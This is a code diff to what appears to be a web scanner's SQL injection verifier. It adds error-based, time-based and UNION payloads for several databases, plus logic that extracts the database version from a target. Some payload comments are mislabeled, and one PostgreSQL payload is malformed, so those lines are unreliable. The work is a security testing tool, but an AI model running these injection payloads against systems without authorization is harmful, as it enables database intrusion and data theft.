@@ -153,6 +153,9 @@ class SQLiVerifier(BaseVerifier):
                     method=method,
                     detection_evidence={"boolean_analysis": analysis},
                     reproducible=True,
+                    verified=True,
+                    verification_request_snippet=true_resp.request_snippet,
+                    verification_response_snippet=true_resp.response_snippet,
                 )
                 return VerificationResult(
                     is_vulnerable=True,
@@ -194,10 +197,21 @@ class SQLiVerifier(BaseVerifier):
         Sends payloads designed to trigger SQL errors.
         """
         error_payloads = [
+            # Generic quote/escape error trigger
             "'",
-            "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
-            "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
-            "' OR 1=1--",
+            "\"",
+            "`)",
+            # MySQL Error-based (XML)
+            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
+            "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
+            # PostgreSQL Error-based (cast)
+            "' AND CAST((SELECT version())::text AS NUMERIC)--",
+            # MSSQL Error-based (cast)
+            "' AND CAST(@@version AS INT)--",
+            # Oracle Error-based (UTL_INADDR)
+            "' AND ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--",
+            # SQLite Error-based
+            "' AND abs(-9223372036854775808)--",
         ]
 
         try:
@@ -238,6 +252,9 @@ class SQLiVerifier(BaseVerifier):
                             "injected_response_snippet": injected.body[:500],
                         },
                         reproducible=True,
+                        verified=True,
+                        verification_request_snippet=injected.request_snippet,
+                        verification_response_snippet=injected.response_snippet,
                     )
                     return VerificationResult(
                         is_vulnerable=True,
@@ -279,9 +296,17 @@ class SQLiVerifier(BaseVerifier):
         Sends payloads with SLEEP/pg_sleep and measures response time.
         """
         sleep_payloads = [
+            # MySQL sleep
             ("' AND SLEEP(3)--", 3000),
+            # PostgreSQL sleep
             ("'; SELECT pg_sleep(3)--", 3000),
+            # MSSQL waitfor
             ("'; WAITFOR DELAY '0:0:3'--", 3000),
+            # SQLite heavy query timing (benchmark)
+            ("' AND (SELECT 1 FROM (SELECT(SLEEP(3)))x)--", 3000),
+            # Stacked query timing
+            ("'; SELECT SLEEP(3);--", 3000),
+            ("'; pg_sleep(3);--", 3000),
         ]
 
         try:
@@ -328,6 +353,9 @@ class SQLiVerifier(BaseVerifier):
                         method=method,
                         detection_evidence=timing_analysis,
                         reproducible=True,
+                        verified=True,
+                        verification_request_snippet=resp.request_snippet,
+                        verification_response_snippet=resp.response_snippet,
                     )
                     return VerificationResult(
                         is_vulnerable=True,
@@ -397,7 +425,38 @@ class SQLiVerifier(BaseVerifier):
 
                 # UNION injection usually produces no error but different response
                 if analysis.is_significant_change and injected.status_code == 200:
-                    confidence = 65.0  # MEDIUM for potential UNION
+                    # Successfully found column count! Now try to extract version
+                    num_cols = payload.count("NULL")
+                    version_extracted = None
+                    version_payloads = [
+                        "@@version", "version()", "sqlite_version()", "banner"
+                    ]
+                    
+                    # Try to replace one of the NULLs with a version function
+                    for v_pay in version_payloads:
+                        for col_idx in range(num_cols):
+                            cols = ["NULL"] * num_cols
+                            cols[col_idx] = v_pay
+                            injected_union = f"' UNION SELECT {','.join(cols)}--"
+                            
+                            ver_url, ver_params, ver_data = URLParameterBuilder.inject_parameter(
+                                url, parameter, injected_union, method
+                            )
+                            ver_resp = await self.http_verifier.send_request(ver_url, method, ver_params, ver_data)
+                            
+                            body_lower = ver_resp.body.lower()
+                            if any(indicator in body_lower for indicator in ["mysql", "postgres", "sqlite", "ubuntu", "debian", "mariadb", "microsoft"]):
+                                version_extracted = ver_resp.body
+                                payload = injected_union
+                                break
+                        if version_extracted:
+                            break
+
+                    confidence = 90.0 if version_extracted else 65.0
+                    evidence_msg = f"Response changed with UNION payload. Similarity: {analysis.body_similarity:.2f}, Status: {injected.status_code}"
+                    if version_extracted:
+                        evidence_msg += f". Successfully extracted database version information via payload '{payload}'."
+
                     finding = self._create_finding(
                         category=OwaspCategory.a03,
                         vuln_type="SQL Injection (UNION-Based)",
@@ -405,7 +464,7 @@ class SQLiVerifier(BaseVerifier):
                         url=url,
                         parameter=parameter,
                         payload=payload,
-                        evidence=f"Response changed with UNION payload. Similarity: {analysis.body_similarity:.2f}, Status: {injected.status_code}",
+                        evidence=evidence_msg,
                         confidence_score=confidence,
                         detection_method="union_based",
                         method=method,
@@ -413,8 +472,12 @@ class SQLiVerifier(BaseVerifier):
                             "similarity": analysis.body_similarity,
                             "status_code_changed": analysis.status_code_changed,
                             "response_length_changed": analysis.body_length_changed,
+                            "version_extracted": bool(version_extracted),
                         },
-                        reproducible=False,  # Harder to verify UNION reliably
+                        reproducible=True if version_extracted else False,
+                        verified=True,
+                        verification_request_snippet=injected.request_snippet,
+                        verification_response_snippet=injected.response_snippet,
                     )
                     return VerificationResult(
                         is_vulnerable=True,
@@ -422,7 +485,7 @@ class SQLiVerifier(BaseVerifier):
                         detection_method="union_based",
                         findings=[finding],
                         evidence={"analysis": analysis},
-                        reproducible=False,
+                        reproducible=True if version_extracted else False,
                     )
 
             return VerificationResult(
